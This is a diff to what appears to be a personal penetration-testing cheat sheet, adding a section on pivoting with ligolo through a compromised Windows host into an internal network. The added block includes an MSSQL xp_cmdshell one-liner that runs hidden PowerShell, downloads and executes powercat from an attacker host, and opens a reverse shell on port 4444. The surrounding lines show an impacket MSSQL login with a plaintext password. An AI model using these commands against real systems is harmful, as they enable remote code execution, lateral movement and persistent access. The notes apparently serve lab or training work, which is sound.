@@ -903,6 +903,31 @@ impacket-mssqlclient sql_svc:Dolphin1@10.10.108.148 -windows-auth
 ```
 
 
+## logolo
+```bash
+sudo ip tuntap add user kali mode tun ligolo
+sudo ip link set ligolo up
+./proxy -selfcert
+
+(On windows machine)
+.\agent.exe -connect 192.168.45.176:11601 -ignore-cert 
+
+(On new terminal on kali)
+sudo ip route add 10.10.108.0/24 dev ligolo
+
+(Back on ligolo)
+session
+1
+start
+listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80
+
+## when connecting from internal machine, make sure to use internal pivot machine's address not kali address
+EXEC xp_cmdshell 'powershell.exe -nop -w hidden -c "IEX ((New-Object Net.WebClient).DownloadString(''http://10.10.108.147:443/powercat.ps1''))"; powercat -c 10.10.108.147 -p 4444 -e powershell';
+```
+
+
+
+
 # Active Directory Privilege
 
 ## GenericAll on a computer
